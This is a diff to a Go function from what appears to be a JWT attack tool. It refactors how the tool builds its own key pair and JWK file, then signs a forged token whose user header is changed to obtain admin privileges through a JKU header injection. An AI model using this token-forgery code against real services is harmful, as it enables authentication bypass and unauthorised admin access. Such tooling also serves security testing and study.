@@ -22,9 +22,22 @@ func launchServer(port int) {
 func generateJkuToken(token *jwt.Token, userHeader string, userValue string, url string) (string, error) {
 
 	tokenCpy := ctrl.CloneToken(token)
+	alg := tokenCpy.Header["alg"].(string)
 
-	//Generate the private key and public key (if needed)
-	jwtKey, pathToFile, err := ctrl.GenerateJWK(tokenCpy.Header["alg"].(string))
+	//Generate private and public keys (if needed)
+	publicKey, privateKey, err := ctrl.GenerateKeys(alg)
+	if err != nil {
+		return "", err
+	}
+
+	//Generate the JWK
+	jwkContent, err := ctrl.GenerateJWK(publicKey, alg)
+	if err != nil {
+		return "", err
+	}
+
+	//Write the jwk into a new file
+	pathToFile, err := ctrl.WriteIntoFile(alg, jwkContent)
 	if err != nil {
 		return "", err
 	}
@@ -35,7 +48,8 @@ func generateJkuToken(token *jwt.Token, userHeader string, userValue string, url
 		return "", err
 	}
 
-	//Change the value of the header to create the admin privs token
+	//If the "user" header has been found
+	//Change the value of the header to create a token with admin privs
 	if userHeader != "" {
 		newToken, err = ctrl.ChangeValue(newToken, userHeader, userValue, false)
 		if err != nil {
@@ -44,7 +58,7 @@ func generateJkuToken(token *jwt.Token, userHeader string, userValue string, url
 	}
 
 	//Sign the token with our private key
-	newJWT, err := newToken.SignedString(jwtKey)
+	newJWT, err := newToken.SignedString(privateKey)
 	if err != nil {
 		return "", err
 	}
